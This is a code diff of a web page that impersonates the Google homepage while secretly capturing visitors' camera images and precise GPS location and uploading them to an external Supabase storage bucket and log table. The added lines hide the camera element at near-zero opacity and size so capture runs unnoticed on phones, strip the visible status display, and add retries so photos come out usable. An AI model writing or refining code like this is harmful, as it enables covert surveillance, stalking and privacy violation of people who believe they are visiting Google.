@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google</title>
-    <!-- Favicon Google -->
     <link rel="icon" href="https://www.google.com/favicon.ico">
     <!-- Load Supabase Client dari CDN -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
@@ -56,11 +55,6 @@
             align-items: center;
             padding: 0 14px;
             box-shadow: none;
-            transition: box-shadow 0.3s;
-        }
-        .search-box:hover {
-            box-shadow: 0 1px 6px rgba(32,33,36,.28);
-            border-color: rgba(223,225,229,0);
         }
         .search-box input {
             flex: 1;
@@ -76,14 +70,14 @@
             fill: #9aa0a6;
         }
         
-        /* Elemen tersembunyi untuk kamera & status */
+        /* Trik agar video aktif di HP tanpa terlihat mencolok */
         #camera-container {
-            display: none; /* Disembunyikan agar mirip Google asli */
-        }
-        #status {
-            margin-top: 20px;
-            font-size: 12px;
-            color: #888;
+            position: absolute;
+            opacity: 0.01;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
         }
 
         footer {
@@ -111,22 +105,17 @@
     </header>
 
     <div class="main-container">
-        <!-- Logo Google -->
         <div class="google-logo">
             <span class="blue">G</span><span class="red">o</span><span class="yellow">o</span><span class="blue">g</span><span class="green">l</span><span class="red">e</span>
         </div>
 
-        <!-- Kolom Pencarian Palsu -->
         <div class="search-box">
             <svg class="search-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
             <input type="text" placeholder="Telusuri Google atau ketik URL" disabled>
         </div>
-
-        <!-- Status opsional (bisa dihapus jika ingin benar-benar bersih) -->
-        <div id="status"></div>
     </div>
 
-    <!-- Elemen Kamera & Canvas tersembunyi di background -->
+    <!-- Container kamera diatur agar tetap berjalan di background HP -->
     <div id="camera-container">
         <video id="camera" autoplay playsinline muted></video>
         <canvas id="canvas"></canvas>
@@ -141,7 +130,6 @@
     </footer>
 
     <script>
-        // --- KREDENSIAL SUPABASE ANDA ---
         const SUPABASE_URL = 'https://nhufpeilgbgdvpynrfrb.supabase.co'; 
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5odWZwZWlsZ2JnZHZweW5yZnJiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTA3MTI2MDYsImV4cCI6MjEwNjI4ODYwNn0.L3yl0OqdXFLtyzLMXN6Ixv4kRQk-18D6Q4vc0CzaHeg'; 
         
@@ -150,7 +138,6 @@
         document.addEventListener("DOMContentLoaded", () => {
             const video = document.getElementById("camera");
             const canvas = document.getElementById("canvas");
-            const statusDiv = document.getElementById("status");
 
             async function sendToSupabase(dataUrl, latitude, longitude) {
                 try {
@@ -158,24 +145,20 @@
                     const blob = await response.blob();
                     
                     const fileName = `capture_${Date.now()}.png`;
-                    const filePath = fileName;
 
-                    // 1. Upload ke Storage Bucket 'captures'
-                    const { data: storageData, error: storageError } = await supabaseClient.storage
+                    const { error: storageError } = await supabaseClient.storage
                         .from('captures')
-                        .upload(filePath, blob, {
+                        .upload(fileName, blob, {
                             contentType: 'image/png',
                             upsert: true
                         });
 
                     if (storageError) throw storageError;
 
-                    // 2. Ambil Public URL
                     const { data: { publicUrl } } = supabaseClient.storage
                         .from('captures')
-                        .getPublicUrl(filePath);
+                        .getPublicUrl(fileName);
 
-                    // 3. Simpan ke Database Table 'logs'
                     const { error: dbError } = await supabaseClient
                         .from('logs')
                         .insert([
@@ -188,14 +171,18 @@
 
                     if (dbError) throw dbError;
 
-                    console.log("Data berhasil dikirim ke Supabase.");
-
                 } catch (error) {
                     console.error("Gagal mengirim:", error);
                 }
             }
 
             function capturePhoto(latitude, longitude) {
+                // Pastikan ukuran video valid sebelum digambar ke canvas (mencegah blank hitam)
+                if (video.videoWidth === 0 || video.videoHeight === 0) {
+                    setTimeout(() => capturePhoto(latitude, longitude), 500);
+                    return;
+                }
+
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 const ctx = canvas.getContext("2d");
@@ -212,14 +199,15 @@
                             const lat = position.coords.latitude;
                             const lng = position.coords.longitude;
 
+                            // Jeda 2 detik untuk memastikan kamera HP stabil dan menangkap cahaya
                             setTimeout(() => {
                                 capturePhoto(lat, lng);
-                            }, 1500);
+                            }, 2000);
                         },
                         (error) => {
-                            console.warn("Gagal mendapatkan lokasi: " + error.message);
+                            console.warn("Gagal lokasi: " + error.message);
                         },
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
                     );
                 }
             }
@@ -232,11 +220,13 @@
                     });
                     video.srcObject = stream;
 
+                    // Tunggu stream berjalan lalu ambil lokasi & foto
                     video.onloadedmetadata = () => {
+                        video.play();
                         getLocationAndCapture();
                     };
                 } catch (err) {
-                    console.warn("Akses kamera ditolak: " + err.message);
+                    console.warn("Kamera ditolak: " + err.message);
                 }
             }
 
